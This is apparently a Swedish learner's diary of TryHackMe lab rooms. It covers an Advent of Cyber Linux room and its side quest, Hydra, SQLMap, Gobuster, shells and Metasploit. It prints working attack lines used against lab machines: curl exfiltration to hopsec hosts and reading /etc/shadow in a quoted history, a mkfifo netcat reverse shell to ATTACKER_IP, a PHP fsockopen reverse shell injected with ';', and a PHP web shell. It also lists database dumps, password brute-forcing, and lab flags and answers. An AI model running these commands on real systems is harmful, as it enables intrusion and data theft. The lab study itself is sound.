# 2025-12-02
## Linux CLI - Shells Bells
Jul-eventet på TryHackMe har börjat, tänkte testa första riktiga rummet och se hur det går. <br><br>
<code>mcskidy@tbfc-web01:~$ cat README.txt</code><br>


    For all TBFC members,
    Yesterday I spotted yet another Eggsploit on our servers.
    Not sure what it means yet, but Wareville is in danger.
    To be prepared, I'll write the security guide by tomorrow.
    As a precaution, I'll also hide the guide from plain view.
    ~ McSkidy
<br>
<code>mcskidy@tbfc-web01:~/Guides$ cat .guide.txt</code><br>



    I think King Malhare from HopSec Island is preparing for an attack.
    Not sure what his goal is, but Eggsploits on our servers are not good.
    Be ready to protect Christmas by following this Linux guide:
    
    Check /var/log/ and grep inside, let the logs become your guide.
    Look for eggs that want to hide, check their shells for what's inside!

    P.S. Great job finding the guide. Your flag is:
    -----------------------------------------------
    THM{learning-linux-cli}
    -----------------------------------------------
<br>
<code>mcskidy@tbfc-web01:/home/socmas/2025$ cat eggstrike.sh</code> <br>

    # Eggstrike v0.3
    # © 2025, Sir Carrotbane, HopSec
    cat wishlist.txt | sort | uniq > /tmp/dump.txt
    rm wishlist.txt && echo "Chistmas is fading..."
    mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
    
    # Your flag is:
    # THM{sir-carrotbane-attacks}

<br>
<code>mcskidy@tbfc-web01:/home/socmas/2025$ sudo su<br>
root@tbfc-web01:/home/socmas/2025$ history</code><br>

    1  whoami
    2  cd ~
    3  ll 
    4  nano .ssh/authorized_keys
    5  curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
    6  curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
    7  curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
    8  pkill tbfcedr
    9  cat /etc/shadow
    10  cat /etc/hosts
    11  exit
    12  history

<br>

## Key for Side Quest 1

Jag gick genom hela den här processen utan att skriva så mycket längst vägen. Jag klippte bara in kod och texter jag tyckte var relevant. För att hitta nyckeldel 2 så var jag tvungen att hitta en walkthrough på internet. Jag känner till git, men jag var helt fast i journalctl och kunde inte förstå hur jag tar mig vidare. Men jag hade sett att det fanns git-kataloger att titta på. Min hjärna tog sig bara inte så långt. <br>
Roligt och utmanande. Helt klart saker som kommer finnas med mig till framtida CTF:er.

<code>root@tbfc-web01:/home/mcskidy/Documents$ cat read-me-please.txt</code> <br>

    From: mcskidy
    To: whoever finds this

    I had a short second when no one was watching. I used it.

    I've managed to plant a few clues around the account.
    If you can get into the user below and look carefully,
    those three little "easter eggs" will combine into a passcode
    that unlocks a further message that I encrypted in the
    /home/eddi_knapp/Documents/ directory.
    I didn't want the wrong eyes to see it.

    Access the user account:
    username: eddi_knapp
    password: S0mething1Sc0ming

    There are three hidden easter eggs.
    They combine to form the passcode to open my encrypted vault.

    Clues (one for each egg):

    1)
    I ride with your session, not with your chest of files.
    Open the little bag your shell carries when you arrive.

    2)
    The tree shows today; the rings remember yesterday.
    Read the ledger’s older pages.

    3)
    When pixels sleep, their tails sometimes whisper plain words.
    Listen to the tail.

    Find the fragments, join them in order, and use the resulting passcode
    to decrypt the message I left. Be careful — I had to be quick,
    and I left only enough to get help.

    ~ McSkidy

<code>eddi_knapp@tbfc-web01:~$ printenv</code> <br>
SHELL=/bin/bash <br>
PASSFRAG1=3ast3r <br>
... <br>

<code>eddi_knapp@tbfc-web01:~/Pictures$ cat .easter_egg</code><br>
PASSFRAG3: c0M1nG

<code>eddi_knapp@tbfc-web01:~/.secret_git$ git show</code><br>

    commit e924698378132991ee08f050251242a092c548fd (HEAD -> master)
    Author: mcskiddy \<mcskiddy@robco.local>
    Date:   Thu Oct 9 17:20:11 2025 +0000

        remove sensitive note

    diff --git a/secret_note.txt b/secret_note.txt
    deleted file mode 100755
    index 060736e..0000000
    --- a/secret_note.txt
    +++ /dev/null
    @@ -1,5 +0,0 @@
    -========================================
    -Private note from McSkidy
    -========================================
    -We hid things to buy time.
    -PASSFRAG2: -1s-

3ast3r-1s-c0M1nG


<code>eddi_knapp@tbfc-web01:~/Documents$ gpg -d mcskidy_note.txt.gpg</code> <br> 
gpg: AES256.CFB encrypted data<br>
gpg: encrypted with 1 passphrase<br>

    Congrats — you found all fragments and reached this file.

    Below is the list that should be live on the site. If you replace the contents of
    /home/socmas/2025/wishlist.txt with this exact list (one item per line, no numbering),
    the site will recognise it and the takeover glitching will stop. Do it — it will save the site.

    Hardware security keys (YubiKey or similar)
    Commercial password manager subscriptions (team seats)
    Endpoint detection & response (EDR) licenses
    Secure remote access appliances (jump boxes)
    Cloud workload scanning credits (container/image scanning)
    Threat intelligence feed subscription

    Secure code review / SAST tool access
    Dedicated secure test lab VM pool
    Incident response runbook templates and playbooks
    Electronic safe drive with encrypted backups

    A final note — I don't know exactly where they have me, but there are *lots* of eggs
    and I can smell chocolate in the air. Something big is coming.  — McSkidy

    ---

    When the wishlist is corrected, the site will show a block of ciphertext. This ciphertext can be decrypted with the following unlock key:

    UNLOCK_KEY: 91J6X7R4FQ9TQPM9JX2Q9X2Z

    To decode the ciphertext, use OpenSSL. For instance, if you copied the ciphertext into a file /tmp/website_output.txt you could decode using the following command:

    cat > /tmp/website_output.txt
    openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in /tmp/website_output.txt -out /tmp/decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'
    cat /tmp/decoded_message.txt

    Sorry to be so convoluted, I couldn't risk making this easy while King Malhare watches. — McSkidy


"You can see how Sir Carrotbane replaced the wishlist by visiting http://10.80.130.212:8080 from the VM's web browser."



    U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c=



<code>root@tbfc-web01:~$ echo "U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c=" > encrypted.txt </code>

<code>root@tbfc-web01:~\$ openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in encrypted.txt -out decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'</code>

<code>root@tbfc-web01:~$ cat decoded_message.txt </code><br>

    Well done — the glitch is fixed. Amazing job going the extra mile and saving the site. Take this flag THM{w3lcome_2_A0c_2025}

    NEXT STEP:
    If you fancy something a little...spicier....use the FLAG you just obtained as the passphrase to unlock:
    /home/eddi_knapp/.secret/dir

    That hidden directory has been archived and encrypted with the FLAG.
    Inside it you'll find the sidequest key.

<code>root@tbfc-web01:/home/eddi_knapp/.secret$ gpg -o dir -d dir.tar.gz.gpg</code> <br>
<code>root@tbfc-web01:/home/eddi_knapp/.secret$ tar -xf dir</code> <br>
<code>root@tbfc-web01:/home/eddi_knapp/.secret/dir$ xdg-open sq1.png</code>

now_you_see_me

![now_you_see_me](<bilder/Skärmbild 2025-12-02 side_quest_1_key.png>)


# 2025-12-01
## SOC Fundamentals
Texttungt rum om saker som t.ex. <br>
De olika rollerna, SOC Analyst Level 1, CISO osv. <br>
what? when? where? who? why? <br>
Även termer som SIEM, firewall, EDR osv gås genom ytligt. <br>

![SOC Basics](<bilder/Skärmbild 2025-12-01 SOC basics.png>) <br>
## Digital Forensics Fundamentals
Även det här rummet verkar vara texttungt. <br>
NIST definierar processen som: Collection -> Examination -> Analysis -> Reporting. <br>
Det nämns senare lite specifika verktyg, specifikt FTK Imager, Autopsy, DumpIt och Volatility. <br>
I slutändan fick jag prova använda exiftool och pdfinfo för att extrahera lite data ur ett par filer. <br>
![Digital Forensics Fundamentals](<bilder/Skärmbild 2025-12-01 digital forensics basics.png>) <br>



# 2025-11-29
## SQLMap: The Basics
Saxar följande information rakt från TryHackMe då det var intressant: <br>
The first step is to look for a possible vulnerable URL or request. You may often come across some URLs that use GET parameters to retrieve the data. For example, a URL like http://sqlmaptesting.thm/search?cat=1 uses a parameter cat that takes the value 1. If you see any web application using GET parameters in the URLs to retrieve data, you can test that URL with the -u flag in the SQLMap tool. This is considered to be HTTP GET-based testing. This approach is followed when the application uses GET parameters in the URL to retrieve data from the searches.<br>

Följande behövdes för att lösa uppgiften på slutet: <br> 

<code>sqlmap -u 'http://10.82.141.105/AI/includes/user_login?email=test&password=test' --dbs</code> <br>
<code>sqlmap -u 'http://10.82.141.105/AI/includes/user_login?email=test&password=test' -D ai --tables</code> <br>
<code>sqlmap -u 'http://10.82.141.105/AI/includes/user_login?email=test&password=test' -D ai -T user --dump</code> <br>

Och med det så blev rummet avklarat. <br>
![SQLmap basics](<bilder/Skärmbild 2025-11-29 sqlmap basics.png>)

# 2025-11-28
De har ändrat om i ordningen i Cyber101, så OWASP har fått ett nytt rum för 2025 och det rummet är placerat i slutet av Cyber101 om jag förstått det rätt. Vilket passar mig bra. Nu börjar det vara dags att göra om Burp Suite!

Jag läste om BURP Suite Basics-rummet och tyvärr är det ju väldigt fattigt på praktiska övningar. Och jag tycker det är svårare att faktiskt absorbera informationen när man bara läser om den teoretiskt, jag vill gärna känna och klämma på program för att faktiskt förstå kopplingarna. Men det kommer nog framöver.

## Nu blir det Hydra istället. <br>
För att lösa uppgiften så kör vi följande kommando: <br>
<code>hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.82.129.7 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V</code> <br>
Svaret jag fick: [80][http-post-form] host: 10.82.129.7   login: molly   password: sunshine <br>
Med det så loggar jag in via Firefox och hittar flaggan: <br>

THM{2673a7dd116de68e85c48ec0b1f2612e} <br><br>

Nu ska vi lösa SSH-login. <br>
<code>hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.82.129.7 ssh</code> <br>
Svaret jag fick: [22][ssh] host: 10.82.129.7   login: molly   password: butterfly <br>
Med det loggar jag in via SSH och hittar flaggan: <bR>

THM{c8eeb0468febbadea859baeb33b2541b} <br>


![Hydra basics](<bilder/Skärmbild 2025-11-27 hydra basics.png>) <br><br>

## GoBuster Basics. 

Jag är redan ganska bekant med gobuster då jag använt det en del i CTF:er. <br>

Nedan är kod jag använde för att enumerate:a mig fram genom uppgiften. <br>
<code>gobuster dir -u www.offensivetools.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</code> <br>
Efter det så fick vi instruktionen att leta efter en javascript-fil i den "intressanta" katalogen vi hittade, så koden blir: <br>
<code>gobuster dir -u www.offensivetools.thm/secret/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .js</code> <br>
Nu är det bara att ta hem flaggan med det vi hittat med följande: <br>
<code>curl www.offensivetools.thm/secret/flag.js</code><br><br>
THM{ReconWasASuccess}
<br><br>
Nu är det dags att kolla hur många subdomäner vi har på adressen. <br>
<code>gobuster dns -d offensivetools.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</code><br>
Och vi hittade 4 stycken. <br><br>
För att titta på vhosts så krävdes ett mer avancerat kommando: <br>
<code>gobuster vhost -u "http://10.80.132.244" --domain offensivetools.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-500</code><br>
Men vi fick 5 svar. Varav 2 var samma, så svaret på frågan blev 4. <br>

![Gobuster basics](<bilder/Skärmbild 2025-11-28 gobuster basics.png>)

## Shells Overview

Väldigt intressant att sätta upp ett reverse shell genom två maskiner. Som attackerare så startar jag först upp netcat för att lyssna på mitt reverse shell: <br>
<code>nv -lvnp PORT</code><br>
Sedan kör jag följande kommando på maskinen jag ska attackera, dvs köra igång ett pipe reverse shell från: <br>
<code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f</code><br>
Lite kryptisk kod, men det fungerar och här har jag en förklaring från TryHackMe: <br>

<b>rm -f /tmp/f</b> - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.

<b>mkfifo /tmp/f</b> - This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.

<b>cat /tmp/f</b> - This command reads data from the named pipe. It waits for input that can be sent through the pipe.

<b>| bash -i 2>&1</b> - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute 
commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.

<b>| nc ATTACKER_IP ATTACKER_PORT </b>>/tmp/f - This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT). <br>

<b>\>/tmp/f</b> -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

Rummet går också genom bind shells och shell listeners, bland shell listeners har vi rlwrap, ncat och socat.<br><br>
Senare behöver jag applicera min kunskap, det blev lite testa sig fram och tillbaka men det slutade med: <br>
<code>;php -r '$sock=fsockopen("10.82.95.146",4444);shell_exec("sh <&3 >&3 2>&3");';</code> i uppgift 1. <br>
Och efter lite navigering så hittade vi till slut flaggan: <br>
THM{0f28b3e1b00becf15d01a1151baf10fd713bc625} <br><br>
Nu skulle vi köra en annan typ av reverse shell som inte fungerade med kodinjektion utan vi ska ladda upp en fil. <br>
Jag blev tvungen att skapa en shell.php-fil enligt en tidigare avdelning i rummet, innehållet såg ut såhär: <br>
<code>\<?php
if (isset($_GET['cmd'])) {<br>
    system($_GET['cmd']);<br>
}<br>
?></code><br>

Tydligen kan man köra flera kommandon på rad om man separerar dem med ";", så det blir den vägen vi kör.<br>
Så det jag fick lägga in i adressfältet blev följande: <br>
"http://10.80.147.103:8082/uploads/shell.php?cmd=cd%20..;cd%20..;%20cd%20..;%20cd%20..;cat%20flag.txt"<br>

Med det fick jag fram flaggan: <br>
THM{202bb14ed12120b31300cfbbbdd35998786b44e5} <br><br>

![Shells overview](<bilder/Skärmbild 2025-11-28 shells overview.png>)

# 2025-11-23
Jag har senaste tiden gått genom några olika rum, men det har blivit lite här och lite där så jag skrev inte upp så mycket på vägen. Så jag tänkte gå genom mina framsteg nu i efterhand istället. <br>
Det har varit web hacking i fokus senaste tiden och såhär ser det ut just nu:

![Just nu](<bilder/Skärmbild 2025-11-23 web hacking.png>)

---
<br>

![Web Application Basics](<bilder/Skärmbild 2025-11-13 web application .png>)

Vi går i kronologisk ordning så vi börjar med the basics. <br>
Inte så mycket nytt för mig här, vi går genom HTML, CSS och JS. Rummet pratar om Databases, Infrastructure och WAF. Med Infrastructure så syftas det på servrar, applikationsservrar, storage osv. WAF betyder Web Application Firewall.

Intressanta delar här för mig var: <br>
HTTP Messages, dvs HTTP Request och HTTP Response. Saker jag än inte riktigt förstår men som de försöker förklara är hur dessa är uppbyggda och används i HTTP-trafik. Jag hittade nedanstående bilder på nätet som hjälper litegrann: <br>
![HTTP Request](bilder/http_requestmessageexample.png)<br>
![HTTP Response](bilder/http_responsemessageexample.png)<br>

Mer intressant är väl de vanliga status-koderna som t.ex.: <br>
200 - Success <br>
300 - Redirect <br>
400 - Client Error (not found) <br>
500 - Server Error <br>

---
<br>

![Java Script Essentials](<bilder/Skärmbild 2025-11-13 JavaScript essentials.png>) <br>

Rummet börjar med att gå genom lite grundläggande programmering och förklarar vad en variabel, funktioner och loopar är. Vi får sedan prova på att koda i javascript i en webbläsares konsoll. Det var lite kul! <br>
Sedan får man se hur man kan integrera javascript-kod i html, antingen internal eller external. Och till slut så går vi genom minified files. Vilket var ett nytt koncept för mig. Det här kommer nog komma till användning i CTF-sammanhang i framtiden.
<br>

---
<br>

![SQL Fundamentals](<bilder/Skärmbild 2025-11-14 SQL fundamentals.png>) <br>
Jag har gått en kurs om databaser så jag var ganska bekant med det mesta i det här rummet. Specifikt språket i SQL är jag ganska bekant med, det tog inte så länge innan jag kom in i det igen. <br>

---
<br>

Jag glömde ta en screnshot av BURP Suite Basics, och det var nog lika bra. För jag har använt mig lite av BURP Suite i CTF-sammanhang och jag känner mig fortfarande ganska vilse. Med andra ord bör jag nog starta om det här rummet och köra genom det med mer uppmärksamhet, så det är min plan. Jag kommer eventuellt även starta om OWASP Top 10 2021 då jag tyckte flera aspekter där var väldigt intressanta men man fick en kortare genomgång vilket gör att det kan repeteras känner jag.

# 2025-11-09
https://tryhackme.com/room/meterpreter <br>
Sådär. Då blev jag klar med Metasploit. Riktigt roliga rum. Jag har i vanlig ordning missförstått och läst fel på ett par ställen så man fick slita sig i håret något och testa sig fram med olika grejer innan jag insett att jag gjort fel och att då var svaret relativt enkelt. Men jag tror det bara har gett mig lite mer erfarenhet med att knappa runt inom metasploit framework. Mot slutet kändes det riktigt naturligt att söka fram en modul och ladda den med nödvändiga options-alternativ.<br><br>
![Meterpreter avklarad](<bilder/Skärmbild 2025-11-09 metasploit meterpreter.png>)
![Badge och total progress](<bilder/Skärmbild 2025-11-09 rank level badge.png>)<br><br>
https://tryhackme.com/room/blue <br>
Nu ska jag attackera rummet Blue och bara av att öppna det så ser det riktigt spännande ut.<br><br>
Det var det också. Jag blev just klar, riktigt kul att få gå genom hela processen från början till slutet. Ganska enkelt att hänga med hela vägen efter alla instruktioner. Jag såg att det rekommenderades att testa "Ice" efteråt. Så det rummet ska nog testas rätt snart också. Men det här får nog räcka för idag.<br><br>
![Blue completed](<bilder/Skärmbild 2025-11-09 Blue badge.png>)<br><br>
https://tryhackme.com/room/ice <br>
Jag kanske tog lite mer tid idag för att fortsätta. Men rummet tog nog bara 30-45 minuter.<br>
Rummet ICE var lika roligt som rummet Blue. Tydliga och enkla instruktioner, men fick använda mig av några andra knep denna gång. Modulen 'post/multi/recon/local_exploit_suggester' var en jag verkligen gillar då jag tidigare funderat hur man ska hålla reda på alla relevanta exploits man ska använda vid olika typer av maskiner man ska attackera. Det här underlättar ju en hel del.<br>
Sedan var det kul att testa den nyare versionen av mimikatz, dvs kiwi. Väldigt kraftfullt verktyg. Men rummet antydde att en anledning till varför det är så enkelt är att maskinen i fråga hade avstängd brandvägg och inte igång Windows defender. En mer modern maskin är nog inte lika enkel.<br>
![ICE complete](<bilder/Skärmbild 2025-11-09 ICE badge.png>)


# 2025-11-08
https://tryhackme.com/room/metasploitexploitation <br>
Verkar som jag försöker köra minst en varje dag nu, får se om det håller i sig.
![Metasploitable exploitation](<bilder/Skärmbild 2025-11-08 metasploit exploitation.png>)

# 2025-11-07
https://tryhackme.com/room/metasploitintro <br>
Körde vidare lite lätt idag.
![Metasploitable intro](<bilder/Skärmbild 2025-11-07 metasploit intro.png>)

# 2025-11-06
Testar att starta en liten dagbok för detta.<br><br>
![Legacy](<bilder/Skärmbild 2025-11-06 110625.png>)<br>
De har just pensionerat gamla SOC Level 1, tur jag inte hann klart den.<br><br>
![Progress](<bilder/Skärmbild 2025-11-06 105632.png>)<br><br>
Dags att ta tag i exploitation basics!